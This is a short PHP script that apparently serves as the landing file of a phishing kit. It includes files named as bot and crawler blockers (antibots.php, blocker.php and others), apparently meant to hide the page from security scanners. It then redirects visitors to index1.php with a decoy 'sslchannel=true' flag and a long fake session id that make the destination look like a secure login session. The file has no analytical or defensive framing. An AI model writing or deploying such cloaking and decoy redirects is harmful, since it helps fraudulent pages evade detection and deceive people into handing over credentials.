<?php
include('blocker.php');
include('antibots.php');
include('block.php');
include('bots.php');
include('bt.php');
header("Location: index1.php?sslchannel=true&sessionid=6lerERgVdubsmaUKU97pb64OHOMAXIR436vHYMCbgOEDZyoUHvjTCnIjcvUadMegTKYRwB2MqHpqfNkXjEQW2yfe3aohWDyPoxHU8KHzr70HVkEfZub13rg7BEoyiXoGu5");
?>